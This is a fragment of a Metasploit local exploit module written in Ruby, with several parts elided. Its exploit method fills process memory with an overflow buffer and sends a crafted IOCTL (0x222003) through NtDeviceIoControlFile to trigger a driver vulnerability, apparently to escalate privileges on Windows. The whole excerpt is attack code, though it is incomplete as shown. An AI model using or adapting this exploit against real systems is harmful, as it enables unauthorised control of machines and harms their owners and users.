...
class MetasploitModule < Msf::Exploit::Local
	...
	def exploit
		...
		this_proc.memory.write(0x1500, 'A'*0x820)
		this_proc.memory.write(0x1d20, "\x00\x10\x00\x00")
		
		print_status("Triggering the vulnerability...")
		session.railgun.ntdll.NtDeviceIoControlFile(handle, nil, nil, nil, 4, 0x222003, 0x1500, 0x824, 0, 0)
